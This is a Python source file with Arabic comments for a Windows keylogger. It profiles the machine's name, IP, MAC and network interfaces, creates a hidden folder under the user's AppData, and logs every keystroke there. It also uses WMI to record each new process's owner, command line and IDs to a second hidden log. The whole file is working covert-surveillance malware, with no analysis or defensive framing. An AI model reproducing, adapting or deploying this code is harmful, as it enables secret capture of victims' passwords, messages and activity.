# استيراد المكتبات اللازمة
import pynput
from pynput.keyboard import Key, Listener
import socket
import uuid
import psutil
import getpass
import wmi
import platform
from datetime import datetime
import threading
import os
import subprocess
# دالة للحصول على معلومات الجهاز
def get_system_info():
    global mac_address
    # الحصول على اسم الجهاز
    device_name = socket.gethostname()
    
    # الحصول على عنوان IP الخاص بالجهاز
    ip_address = socket.gethostbyname(device_name)

    # الحصول على MAC Address
    mac_address = ':'.join(['{:02x}'.format((uuid.UUID(int=uuid.getnode()).node >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

    return f"Device Name: {device_name}\nIP Address: {ip_address}\nMAC Address: {mac_address}\n"
user_name  = getpass.getuser()
local_appdata_path = os.path.join("C:\\Users", user_name, "AppData", "Local", "p2c917d2c_e128_4f93_92fd_044e9fcf1500")
if not os.path.exists(local_appdata_path):
    os.makedirs(local_appdata_path)
subprocess.run(['attrib', '+h', local_appdata_path])
    
# دالة للحصول على معرف الجهاز
def get_device_id():
    system_info = platform.uname()
    system_id = str(uuid.uuid4())  # إنشاء معرّف فريد باستخدام UUID
    device_id = f"System: {system_info.system}, Node Name: {system_info.node}, Release: {system_info.release}, Version: {system_info.version}, Machine: {system_info.machine}, Processor: {system_info.processor},\n Device ID: {system_id}"
    return device_id

# دالة للحصول على معلومات الواجهة الشبكية الافتراضية باستخدام psutil
def get_default_interface_info():
    default_interface = None
    for interface, addrs in psutil.net_if_addrs().items():
        if addrs:
            default_interface = interface
            break

    if default_interface:
        net_addrs = psutil.net_if_addrs()[default_interface]
        dns_ipv6 = ""
        dns_ipv4_primary = ""
        dns_ipv4_secondary = ""

        net_info = psutil.net_if_addrs()
        for interface, stats in net_info.items():
            if interface == default_interface:
                company_manufacturer = stats[0].address if len(stats) > 0 else ""
                description = stats[1].address if len(stats) > 1 else ""
                driver_version = stats[2].address if len(stats) > 2 else ""
                break

        return f"Link speed (Receive/Transmit): 100/100 (Mbps)\n" \
               f"IPv6 address: {net_addrs[0].address if len(net_addrs) > 0 else ''}\n" \
               f"Link-local IPv6 address: {net_addrs[1].address if len(net_addrs) > 1 else ''}\n" \
               f"IPv6 DNS servers: {dns_ipv6}\n" \
               f"IPv4 address: {net_addrs[2].address if len(net_addrs) > 2 else ''}\n" \
               f"IPv4 DNS servers: {dns_ipv4_primary}\n" \
               f"{dns_ipv4_secondary}\n" \
               f"Primary DNS suffix: home\n" \
               f"Manufacturer: {company_manufacturer}\n" \
               f"Description: {description}\n" \
               f"Driver version: {driver_version}\n" \
               f"Physical address (MAC): {net_addrs[3].address if len(net_addrs) > 3 else ''}\n"
    else:
        return "لا يمكن العثور على واجهة شبكية افتراضية."

# تهيئة العناصر الأساسية مثل عنوان MAC واسم الملف
mac_address = '-'.join(['{:02x}'.format((uuid.UUID(int=uuid.getnode()).node >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
file_name = os.path.join(local_appdata_path, f"output_{mac_address}.log")
  # تغيير امتداد الملف إلى .log لجعله نصيًا
system_info = get_system_info()
interface_info = get_default_interface_info()
device_id = get_device_id()

# إعداد الملف وتسجيل معلومات النظام والجهاز ومعلومات الواجهة الشبكية
with open(file_name, "w", encoding="utf-8") as f:
    f.write("#=============================================== system info ===============================================#\n")
    f.write(f"User: {getpass.getuser()}\n")
    f.write(system_info)
    f.write(f"Device ID: {device_id}\n")
    f.write(interface_info)
    f.write('#=============================================== keylogger ===============================================#\n')
    f.write('\n')

# تهيئة متغيرات الضغطات على الأزرار
count = 0
Keys = []

# دالة تستجيب لضغطة زر
def on_press(key):
    global Keys, count

    try:
        char = key.char
        Keys.append(char)
    except AttributeError:
        if key == Key.space:
            Keys.append(' ')
        elif key == Key.enter:
            Keys.append('\n')

    count += 1

    if count >= 1:  # زيادة الحد الأدنى لعدد الضغطات لحفظها في الملف
        count = 0
        write_to_file(Keys)
        Keys = []

# دالة لكتابة الضغطات إلى الملف
def write_to_file(keys):
    with open(file_name, "a", encoding="utf-8") as f:
        for key in keys:
            f.write(key)

# دالة تستجيب لإطلاق زر
def on_release(key):
    pass

# إعداد متغير التنفيذ المتزامن لمسجل المفاتيح
def keylogger_thread():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=keylogger_thread)
    keylogger_thread.start()

    # دالة لتسجيل المعلومات حول عمليات النظام
    process_monitor_log_file = os.path.join(local_appdata_path, f"process_monitor_log_{mac_address.replace(':', '').replace('-', '')}.log")
    def log_to_file(message):
        global now
        mac_address = '-'.join(['{:02x}'.format((uuid.UUID(int=uuid.getnode()).node >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
        now = datetime.now()
        fd = open(process_monitor_log_file, "ab")
        log_entry = f"{message}\r\n"
        fd.write(log_entry.encode('utf-8'))
        fd.close()
        return

    # تسجيل البدء ومراقبة العمليات المنشأة
    log_to_file("Time, User, Executable, CommandLine, PID, Parent PID, Privileges")
    c = wmi.WMI()
    process_watcher = c.Win32_Process.watch_for("creation")

    while True:
        try:
            new_process = process_watcher()
            proc_owner = new_process.GetOwner()
            proc_owner = "%s\\%s" % (proc_owner[0], proc_owner[2])
            create_date = now.strftime("%Y-%m-%d %H:%M:%S")
            executable = new_process.ExecutablePath
            cmdline = new_process.CommandLine
            pid = new_process.ProcessId
            parent_pid = new_process.ParentProcessId
            privileges = "N/A"
            process_log_message = f"{create_date}    ,{proc_owner}   ,{executable}   ,{cmdline}   ,{pid}   ,{parent_pid}  ,{privileges}\r\n"
            print(process_log_message)
            log_to_file(process_log_message)
        except Exception as e:
            # التعامل مع الأخطاء وتسجيلها بدلاً من تجاهلها
            error_message = f"Error: {str(e)}\r\n"
            log_to_file(error_message)
